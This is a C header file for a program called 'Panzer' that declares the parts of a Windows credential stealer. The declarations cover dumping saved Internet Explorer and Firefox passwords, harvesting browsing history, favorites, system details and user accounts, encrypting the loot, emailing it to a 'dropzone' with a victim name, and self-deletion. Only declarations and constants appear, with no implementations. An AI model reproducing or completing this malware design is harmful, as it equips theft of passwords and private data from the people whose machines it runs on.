#ifndef _PANZER_DEFINITIONS_
  #define _PANZER_DEFINITIONS_

  /*
   * Constants, data types and function forward declarations
   * "Panzer_Client.cpp"
   *
   */

  #define MAX_BUF_SIZE 1024
  #define snprintf _snprintf

  void printDebug(char *pDataString);
  char *addDataToBuffer(char *pOldData, int *pOldDataSize, char *pNewData, int pNewDataSize);







  /*
   * Constants, data types and function forward declarations
   * "Panzer_Crypto.cpp"
   *
   */

  #define SBOX_SIZE 1024

  int RC4prepareKey(unsigned char *pKey);
  int RC4Encrypt(unsigned char *pKey, unsigned char *pPlainText, int pPlainTextLength, unsigned char *pCipherText, int pMaxCipherTextLength, int *pOutputLength);









  /*
   * Constants, data types and function forward declarations
   * "Panzer_Base64.cpp"
   *
   */

  int Base64Encode(char * coded_dst, const char *plain_src, int len_plain_src);





  /*
   * Constants, data types and function forward declarations
   * "Accounts_IE.cpp"
   *
   */

  #import "pstorec.dll" no_namespace

  struct PASSWORD_CACHE_ENTRY 
  {
    WORD cbEntry; 
    WORD cbResource;  
    WORD cbPassword; 
    BYTE iEntry;
    BYTE nType; 
    char abResource[1];
  };


  typedef BOOL (FAR PASCAL *CACHECALLBACK)( struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData);
  typedef DWORD (WINAPI *ENUMPASSWORD)(LPSTR pbPrefix, WORD  cbPrefix, BYTE  nType, CACHECALLBACK pfnCallback, DWORD dwRefData);
  typedef HRESULT (WINAPI *tPStoreCreateInstance)(IPStore **, DWORD, DWORD, DWORD);


  char *dumpIE6Accounts(char *pDataBufferAddress, int *pDataBufferSize);









  /*
   * Constants, data types and function forward declarations
   * "Accounts_FF.cpp"
   *
   */

  #define NSS_LIBRARY_NAME   "nss3.dll"
  #define PLC_LIBRARY_NAME   "plc4.dll"
  #define NSPR_LIBRARY_NAME  "nspr4.dll"
  #define PLDS_LIBRARY_NAME  "plds4.dll"
  #define SOFTN_LIBRARY_NAME "softokn3.dll"

  #define FIREFOX_PATH           "Mozilla\\Firefox\\"
  #define FIREFOX_REG_PATH       "SOFTWARE\\Clients\\StartMenuInternet\\firefox.exe\\shell\\open\\command"
  #define FIREFOX_PROFILES_FILE  "profiles.ini"

  #define HEADER_VERSION1    "#2c"
  #define HEADER_VERSION2    "#2d"
  #define HEADER_VERSION3    "#2e"
  #define CRYPT_PREFIX       "~"


  // Internal structure declaration taken from firefox.....
  typedef enum SECItemType
  {
    siBuffer = 0,
    siClearDataBuffer = 1,
    siCipherDataBuffer = 2,
    siDERCertBuffer = 3,
    siEncodedCertBuffer = 4,
    siDERNameBuffer = 5,
    siEncodedNameBuffer = 6,
    siAsciiNameString = 7,
    siAsciiString = 8,
    siDEROID = 9,
    siUnsignedInteger = 10,
    siUTCTime = 11,
    siGeneralizedTime = 12
  };


  struct SECItem 
  {
    SECItemType type;
    unsigned char *data;
    unsigned int len;
  };

  typedef enum SECStatus 
  {
    SECWouldBlock = -2,
    SECFailure = -1,
    SECSuccess = 0
  };


  typedef struct PK11SlotInfoStr PK11SlotInfo;


  // NSS Library functions
  typedef SECStatus (*NSS_Init) (const char *configdir);
  typedef SECStatus (*NSS_Shutdown) (void);
  typedef PK11SlotInfo *(*PK11_GetInternalKeySlot) (void);
  typedef void (*PK11_FreeSlot) (PK11SlotInfo *slot);
  typedef SECStatus (*PK11_CheckUserPassword) (PK11SlotInfo *slot,char *pw);
  typedef SECStatus (*PK11_Authenticate) (PK11SlotInfo *slot, int loadCerts, void *wincx);
  typedef SECStatus (*PK11SDR_Decrypt) (SECItem *data, SECItem *result, void *cx);

  // PLC Library functions
  typedef char *(*PL_Base64Decode)(const char *src, unsigned int srclen, char *dest);


  int directoryExists(char *pPath);
  void lowerCase(char *pBuffer);
  char *dumpFFAccounts(char *pDataBufferAddress, int *pDataBufferSize);

  char *getFirefoxLibPath(void);
  char *getCurrentUserProfilePath(void);
  int initializeFirefoxLibrary(char *pFFPath);
  HMODULE loadLib(char *pFFDir, char *pLibraryName);
  void terminateFirefoxLibrary(void);
  int initializeNSSLibrary(char *pProfilePath, char *pPassword);
  void dumpSignonSecrets(char *pProfilePath, char *pDataBufferAddress, int *pDataBufferSize);
  int checkMasterPassword(char *pPassword); 

  int decryptSecretString(char *pCryptData, char **pClearData);
  char *base64Decode(char *pCryptData, int *pDecodeLen);
  int PK11Decrypt(char *decodeData, int decodeLen, char **clearData, int *pDecodedDataLength);



  /*
   * Constants, data types and function forward declarations
   * "Panzer_Selfdelete.cpp"
   *
   */

  void deleteYourself();




  /*
   * Constants, data types and function forward declarations
   * "Panzer_Dropzone.cpp"
   *
   */

  int sendMail(char *pSMTPServer, char* pRecipient, char* pSender, char *pVictimName, char* pDataBuffer, int pDataBufferLength);







  /*
   * Constants, data types and function forward declarations
   * "Panzer_Systeminformation.cpp"
   *
   */

  typedef enum OS
  {
    Win32s = 1,
    Windows95,
    Windows98,
    WindowsME,
    WindowsNT,
    Windows2000,
    WindowsXP,
    Windows2003,
    WindowsVista,
  } eOSTypes;

  char *generalSystemInformation(char *pDataBufferAddress, int *pDataBufferSize);
  int getMemoryInformation(char *pMemoryInformation, int pBufferSize);
  int getProcessorInformation(char *pProcessorInformation, int pBufferSize);
  int getWindowsVersion(char *pOSVersion, int pBufferLength);
  char *enumerateLocalUsers(char *pDataBufferAddress, int *pBufferSize);




  /*
   * Constants, data types and function forward declarations
   * "Favorites_IE.cpp"
   *
   */

  char *searchIEFavorites(char *pBaseDirectory, char *pDataBufferAddress, int *pDataBufferSize);
  char *extractFavoriteDetails(char *pFileName, char *pDataBufferAddress, int *pDataBufferSize);





  /*
   * Constants, data types and function forward declarations
   * "History_IE.cpp"
   *
   */

  const int TYPE_UNDEF = 0x00;
  const int TYPE_URL   = 0x01;
  const int TYPE_REDR  = 0x02;
  const int TYPE_UNKN  = 0x03;

  const int URL_URL_OFFSET  = 104;
  const int URL_TIME_OFFSET = 16;
  const int REDR_URL_OFFSET = 16;

  struct sHistory 
  {
    int lType;
    char *lURL;
    SYSTEMTIME st;
  };

  char *getIEHistory(char *pBaseDirectory, char *pDataBufferAddress, int *pDataBufferSize);
  char *dumpHistoryEntries(char *pFileName, char *pDataBufferAddress, int *pDataBufferSize);
  int extractURL(char *pBuf, int pType, struct sHistory *pHistory);

#endif

